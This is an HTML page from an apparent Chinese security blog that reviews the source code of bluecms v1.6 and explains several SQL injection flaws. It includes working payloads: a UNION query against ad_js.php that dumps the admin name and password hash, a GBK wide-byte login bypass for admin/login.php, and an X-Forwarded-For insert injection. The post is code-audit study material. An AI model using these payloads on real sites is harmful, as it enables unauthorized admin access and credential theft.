@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="概述很久没有代码审计了，拿一套简单的找找感觉。bluecms是一套比较老的门户网站cms，网上也有很多关于它的漏洞还未修补，所以下文的漏洞也不算是最新的，仅当是练练手。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【Code Review】bluecms v1.6 Sql Injection 分析">
+<meta property="og:url" content="http://blog.0kami.cn/2017/01/11/bluecms-v1-6-Sql-Injection/index.html">
+<meta property="og:site_name" content="0kami's Blog">
+<meta property="og:description" content="概述很久没有代码审计了，拿一套简单的找找感觉。bluecms是一套比较老的门户网站cms，网上也有很多关于它的漏洞还未修补，所以下文的漏洞也不算是最新的，仅当是练练手。">
+<meta property="og:image" content="http://blog.0kami.cn/../../../../img/bluecms_code_review/bluecms_login_success.png">
+<meta property="og:image" content="http://blog.0kami.cn/../../../../img/bluecms_code_review/bluecms_getip.png">
+<meta property="og:image" content="http://blog.0kami.cn/../../../../img/bluecms_code_review/bluecms_online_ip.png">
+<meta property="og:image" content="http://blog.0kami.cn/../../../../img/bluecms_code_review/bluecms_ip_injection.png">
+<meta property="og:image" content="http://blog.0kami.cn/../../../../img/bluecms_code_review/bluecms_ip_results.png">
+<meta property="og:updated_time" content="2018-01-25T07:14:44.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="【Code Review】bluecms v1.6 Sql Injection 分析">
+<meta name="twitter:description" content="概述很久没有代码审计了，拿一套简单的找找感觉。bluecms是一套比较老的门户网站cms，网上也有很多关于它的漏洞还未修补，所以下文的漏洞也不算是最新的，仅当是练练手。">
+<meta name="twitter:image" content="http://blog.0kami.cn/../../../../img/bluecms_code_review/bluecms_login_success.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>【Code Review】bluecms v1.6 Sql Injection 分析</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+</head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories/notes/">Notes</a></li>
+         
+          <li><a href="/categories/codereview/">CodeReview</a></li>
+         
+          <li><a href="/categories/ctf/">CTF</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2017/01/13/Struts2-history-payload/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2016/12/19/file-include-vulnerability/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://blog.0kami.cn/2017/01/11/bluecms-v1-6-Sql-Injection/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://blog.0kami.cn/2017/01/11/bluecms-v1-6-Sql-Injection/&text=【Code Review】bluecms v1.6 Sql Injection 分析"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://blog.0kami.cn/2017/01/11/bluecms-v1-6-Sql-Injection/&title=【Code Review】bluecms v1.6 Sql Injection 分析"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.0kami.cn/2017/01/11/bluecms-v1-6-Sql-Injection/&is_video=false&description=【Code Review】bluecms v1.6 Sql Injection 分析"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=【Code Review】bluecms v1.6 Sql Injection 分析&body=Check out this article: http://blog.0kami.cn/2017/01/11/bluecms-v1-6-Sql-Injection/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://blog.0kami.cn/2017/01/11/bluecms-v1-6-Sql-Injection/&title=【Code Review】bluecms v1.6 Sql Injection 分析"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://blog.0kami.cn/2017/01/11/bluecms-v1-6-Sql-Injection/&title=【Code Review】bluecms v1.6 Sql Injection 分析"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://blog.0kami.cn/2017/01/11/bluecms-v1-6-Sql-Injection/&title=【Code Review】bluecms v1.6 Sql Injection 分析"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://blog.0kami.cn/2017/01/11/bluecms-v1-6-Sql-Injection/&title=【Code Review】bluecms v1.6 Sql Injection 分析"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://blog.0kami.cn/2017/01/11/bluecms-v1-6-Sql-Injection/&name=【Code Review】bluecms v1.6 Sql Injection 分析&description=&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;很久没有代码审计了，拿一套简单的找找感觉。bluecms是一套比较老的门户网站cms，网上也有很多关于它的漏洞还未修补，所以下文的漏洞也不算是最新的，仅当是练练手。&lt;/p&gt;"><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#概述"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL注入分析"><span class="toc-number">2.</span> <span class="toc-text">SQL注入分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#全局数据转义"><span class="toc-number">2.1.</span> <span class="toc-text">全局数据转义</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#整数型注入"><span class="toc-number">2.2.</span> <span class="toc-text">整数型注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#宽字节注入"><span class="toc-number">2.3.</span> <span class="toc-text">宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#后台登录处"><span class="toc-number">2.3.1.</span> <span class="toc-text">后台登录处</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#存入ip造成注入"><span class="toc-number">2.4.</span> <span class="toc-text">存入ip造成注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        【Code Review】bluecms v1.6 Sql Injection 分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">0kami's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2017-01-11T14:02:11.000Z" itemprop="datePublished">2017-01-11</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/cms/">cms</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>很久没有代码审计了，拿一套简单的找找感觉。bluecms是一套比较老的门户网站cms，网上也有很多关于它的漏洞还未修补，所以下文的漏洞也不算是最新的，仅当是练练手。</p>
+<a id="more"></a>
+<h1 id="SQL注入分析"><a href="#SQL注入分析" class="headerlink" title="SQL注入分析"></a>SQL注入分析</h1><p>首先关注一下数据的输入</p>
+<h2 id="全局数据转义"><a href="#全局数据转义" class="headerlink" title="全局数据转义"></a>全局数据转义</h2><p>在common.inc.php中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">if(!get_magic_quotes_gpc())</div><div class="line">&#123;</div><div class="line">	$_POST = deep_addslashes($_POST);</div><div class="line">	$_GET = deep_addslashes($_GET);</div><div class="line">	$_COOKIES = deep_addslashes($_COOKIES);</div><div class="line">	$_REQUEST = deep_addslashes($_REQUEST);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>再跟进一下deep_addslashes</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">function deep_addslashes($str)</div><div class="line">&#123;</div><div class="line">	if(is_array($str))</div><div class="line">	&#123;</div><div class="line">		foreach($str as $key=&gt;$val)</div><div class="line">		&#123;</div><div class="line">			$str[$key] = deep_addslashes($val);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	else</div><div class="line">	&#123;</div><div class="line">		$str = addslashes($str);</div><div class="line">	&#125;</div><div class="line">	return $str;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>可以发现对数据的注入，进行了加斜杠转义的操作。那么接下来找注入思路主要有以下3点：</p>
+<ol>
+<li>找整数型注入</li>
+<li>整套cms默认gb2312编码，容易造成宽字节注入</li>
+<li>http头并不在转义的范围内，所以类似存入ip，reffer的位置也能发生注入</li>
+</ol>
+<h2 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h2><p>拿grep匹配了一下$_GET，找到一处不做其他过滤的整数型位置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./ad_js.php:$ad_id = !empty($_GET[&apos;ad_id&apos;]) ? trim($_GET[&apos;ad_id&apos;]) : &apos;&apos;;</div></pre></td></tr></table></figure>
+<p>跟进ad_js.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ad_id = !empty($_GET[&apos;ad_id&apos;]) ? trim($_GET[&apos;ad_id&apos;]) : &apos;&apos;;</div><div class="line">if(empty($ad_id))</div><div class="line">&#123;</div><div class="line">	echo &apos;Error!&apos;;</div><div class="line">	exit();</div><div class="line">&#125;</div><div class="line"></div><div class="line">$ad = $db-&gt;getone(&quot;SELECT * FROM &quot;.table(&apos;ad&apos;).&quot; WHERE ad_id =&quot;.$ad_id);</div></pre></td></tr></table></figure>
+<p>getone函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">function getone($sql, $type=MYSQL_ASSOC)&#123;</div><div class="line">    	$query = $this-&gt;query($sql,$this-&gt;linkid);</div><div class="line">    	$row = mysql_fetch_array($query, $type);</div><div class="line">    	return $row;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>可以看到这里对ad_id没有做其他过滤处理，造成了整数型注入,由于后面会将ad_content打印在页面上，所以直接用union注入就可以获得数据，构造payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/ad_js.php?ad_id=1%20union%20select%201,2,3,4,5,6,concat(admin_name,0x23,pwd)%20from%20blue_admin%20limit%201</div></pre></td></tr></table></figure>
+<p>结果可以在返回的界面中看到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;!--</div><div class="line">document.write(&quot;admin#21232f297a57a5a743894a0e4a801fc3&quot;);</div><div class="line">--&gt;</div></pre></td></tr></table></figure>
+<p>ps:因为该cms错误回显具体sql语句，表前缀可以通过报错的方法把表前缀爆出来。</p>
+<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>bluecms操作数据库的具体类定义在mysql.class.php,默认连接时的编码为gbk，我们可以知道当数据库连接时的编码为gbk等双字节编码时，容易发生宽字节注入。前面提到该套cms对数据输入进行了转义的操作，那么刚刚好条件都齐了，必然存在宽字节注入。grep看了一下，基本上的字符串都只是做了转义处理，所以字符串数据输入点都存在宽字节注入。大多数注入都是盲注，没找到具体可以会显数据的地方，这里就简单看一下登陆处</p>
+<h3 id="后台登录处"><a href="#后台登录处" class="headerlink" title="后台登录处"></a>后台登录处</h3><p>其实前台user.php，也存在注入，只是盲注，这里就取简单的后台登录验证处<br>admin/login.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">elseif($act == &apos;do_login&apos;)&#123;</div><div class="line"> 	$admin_name = isset($_POST[&apos;admin_name&apos;]) ? trim($_POST[&apos;admin_name&apos;]) : &apos;&apos;;</div><div class="line"> 	$admin_pwd = isset($_POST[&apos;admin_pwd&apos;]) ? trim($_POST[&apos;admin_pwd&apos;]) : &apos;&apos;;</div><div class="line"> 	$remember = isset($_POST) ? intval($_POST[&apos;rememberme&apos;]) : 0;</div><div class="line"> 	if($admin_name == &apos;&apos;)&#123;</div><div class="line"> 		showmsg(&apos;xxx&apos;);</div><div class="line"> 	&#125;</div><div class="line"> 	if($admin_pwd == &apos;&apos;)&#123;</div><div class="line"> 		showmsg(&apos;xxx&apos;);</div><div class="line"> 	&#125;</div><div class="line"> 	if(check_admin($admin_name, $admin_pwd))&#123;</div><div class="line"> 		update_admin_info($admin_name);</div><div class="line"> 		if($remember == 1)&#123;</div><div class="line"> 			setcookie(&apos;Blue[admin_id]&apos;, $_SESSION[&apos;admin_id&apos;], time()+86400);</div><div class="line"> 			setcookie(&apos;Blue[admin_name]&apos;, $admin_name, time()+86400);</div><div class="line">			setcookie(&apos;Blue[admin_pwd]&apos;, md5(md5($admin_pwd).$_CFG[&apos;cookie_hash&apos;]), time()+86400);</div><div class="line"> 		&#125;</div><div class="line"> 	&#125;else&#123;</div><div class="line"> 		showmsg(&apos;xxx&apos;);</div><div class="line"> 	&#125;</div><div class="line"> 	showmsg(&apos;xxx&apos;, &apos;index.php&apos;);</div><div class="line"> &#125;</div></pre></td></tr></table></figure>
+<p>继续跟进check_admin</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">function check_admin($name, $pwd)</div><div class="line">&#123;</div><div class="line">	global $db;</div><div class="line">	$row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&apos;admin&apos;).&quot; WHERE admin_name=&apos;$name&apos; and pwd = md5(&apos;$pwd&apos;)&quot;);</div><div class="line"> 	if($row[&apos;num&apos;] &gt; 0)</div><div class="line"> 	&#123;</div><div class="line"> 		return true;</div><div class="line"> 	&#125;</div><div class="line"> 	else</div><div class="line"> 	&#123;</div><div class="line"> 		return false;</div><div class="line"> 	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>可以看到这里发生了一次登陆验证，可以通过宽字节注入来做万能密码登陆。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">user_name=admin%65%27+or+1%3D1%23&amp;pwd=123</div></pre></td></tr></table></figure>
+<p><img src="../../../../img/bluecms_code_review/bluecms_login_success.png" alt=""></p>
+<h2 id="存入ip造成注入"><a href="#存入ip造成注入" class="headerlink" title="存入ip造成注入"></a>存入ip造成注入</h2><p>在common.inc.php中可以找到getip()函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">function getip()</div><div class="line">&#123;</div><div class="line">	if (getenv(&apos;HTTP_CLIENT_IP&apos;))</div><div class="line">	&#123;</div><div class="line">		$ip = getenv(&apos;HTTP_CLIENT_IP&apos;); </div><div class="line">	&#125;</div><div class="line">	elseif (getenv(&apos;HTTP_X_FORWARDED_FOR&apos;)) </div><div class="line">	&#123; </div><div class="line">		$ip = getenv(&apos;HTTP_X_FORWARDED_FOR&apos;);</div><div class="line">	&#125;</div><div class="line">	elseif (getenv(&apos;HTTP_X_FORWARDED&apos;)) </div><div class="line">	&#123; </div><div class="line">		$ip = getenv(&apos;HTTP_X_FORWARDED&apos;);</div><div class="line">	&#125;</div><div class="line">	elseif (getenv(&apos;HTTP_FORWARDED_FOR&apos;))</div><div class="line">	&#123;</div><div class="line">		$ip = getenv(&apos;HTTP_FORWARDED_FOR&apos;); </div><div class="line">	&#125;</div><div class="line">	elseif (getenv(&apos;HTTP_FORWARDED&apos;))</div><div class="line">	&#123;</div><div class="line">		$ip = getenv(&apos;HTTP_FORWARDED&apos;);</div><div class="line">	&#125;</div><div class="line">	else</div><div class="line">	&#123; </div><div class="line">		$ip = $_SERVER[&apos;REMOTE_ADDR&apos;];</div><div class="line">	&#125;</div><div class="line">	return $ip;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>再看看调用他的位置<br><img src="../../../../img/bluecms_code_review/bluecms_getip.png" alt=""></p>
+<p>online_ip调用处<br><img src="../../../../img/bluecms_code_review/bluecms_online_ip.png" alt=""></p>
+<p>看看guest_book.php处存在insert注入，并且可以通过覆盖后面的content，造成数据回显。通过xff传入注入语句或者client ip传入。</p>
+<p><img src="../../../../img/bluecms_code_review/bluecms_ip_injection.png" alt=""><br>结果可以看到<br><img src="../../../../img/bluecms_code_review/bluecms_ip_results.png" alt=""></p>
+<p>其他位置的注入，不能回显，就不分析了。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总体来说，直接可以grep到<code>$_GET</code>、<code>$_POST</code>、<code>$_REQUEST</code>的cms，审计起来会比较轻松。可以先从入口看起，将common,config等文件看一遍，再查找危险函数，数据入口就可审计出几个漏洞来。bluecms暂时审计到这一步，主要找的是SQL注入的漏洞。其他漏洞打算准备另外一套cms来审计:)</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+        </div>
+    </div>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories/notes/">Notes</a></li>
+         
+          <li><a href="/categories/codereview/">CodeReview</a></li>
+         
+          <li><a href="/categories/ctf/">CTF</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#概述"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL注入分析"><span class="toc-number">2.</span> <span class="toc-text">SQL注入分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#全局数据转义"><span class="toc-number">2.1.</span> <span class="toc-text">全局数据转义</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#整数型注入"><span class="toc-number">2.2.</span> <span class="toc-text">整数型注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#宽字节注入"><span class="toc-number">2.3.</span> <span class="toc-text">宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#后台登录处"><span class="toc-number">2.3.1.</span> <span class="toc-text">后台登录处</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#存入ip造成注入"><span class="toc-number">2.4.</span> <span class="toc-text">存入ip造成注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://blog.0kami.cn/2017/01/11/bluecms-v1-6-Sql-Injection/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://blog.0kami.cn/2017/01/11/bluecms-v1-6-Sql-Injection/&text=【Code Review】bluecms v1.6 Sql Injection 分析"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://blog.0kami.cn/2017/01/11/bluecms-v1-6-Sql-Injection/&title=【Code Review】bluecms v1.6 Sql Injection 分析"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.0kami.cn/2017/01/11/bluecms-v1-6-Sql-Injection/&is_video=false&description=【Code Review】bluecms v1.6 Sql Injection 分析"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=【Code Review】bluecms v1.6 Sql Injection 分析&body=Check out this article: http://blog.0kami.cn/2017/01/11/bluecms-v1-6-Sql-Injection/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://blog.0kami.cn/2017/01/11/bluecms-v1-6-Sql-Injection/&title=【Code Review】bluecms v1.6 Sql Injection 分析"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://blog.0kami.cn/2017/01/11/bluecms-v1-6-Sql-Injection/&title=【Code Review】bluecms v1.6 Sql Injection 分析"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://blog.0kami.cn/2017/01/11/bluecms-v1-6-Sql-Injection/&title=【Code Review】bluecms v1.6 Sql Injection 分析"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://blog.0kami.cn/2017/01/11/bluecms-v1-6-Sql-Injection/&title=【Code Review】bluecms v1.6 Sql Injection 分析"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://blog.0kami.cn/2017/01/11/bluecms-v1-6-Sql-Injection/&name=【Code Review】bluecms v1.6 Sql Injection 分析&description=&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;很久没有代码审计了，拿一套简单的找找感觉。bluecms是一套比较老的门户网站cms，网上也有很多关于它的漏洞还未修补，所以下文的漏洞也不算是最新的，仅当是练练手。&lt;/p&gt;"><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 0kami
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories/notes/">Notes</a></li>
+         
+          <li><a href="/categories/codereview/">CodeReview</a></li>
+         
+          <li><a href="/categories/ctf/">CTF</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-37473492-6', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = '0kami';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
